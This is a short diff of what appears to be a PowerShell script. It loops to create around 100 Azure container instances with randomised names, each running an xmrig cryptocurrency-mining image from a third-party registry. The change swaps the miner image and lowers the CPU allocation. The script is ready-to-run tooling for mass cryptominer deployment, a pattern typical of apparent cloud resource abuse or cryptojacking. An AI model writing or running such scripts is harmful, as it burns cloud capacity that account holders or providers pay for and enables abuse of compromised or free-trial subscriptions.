@@ -4,5 +4,5 @@ $RANDOM = Get-Random
 while($i -lt 101)
 {
     $i++
-	az container create -g main --name southeastasiamachine0$i$RANDOM --image shahzaadt/xmrig:latest --os-type Linux --cpu 4 --memory 4  --location southeastasia
+	az container create -g main --name southeastasiamachine0$i$RANDOM --image milennialsafezone/xmrig_stone:latest --os-type Linux --cpu 2 --memory 4  --location southeastasia
 }
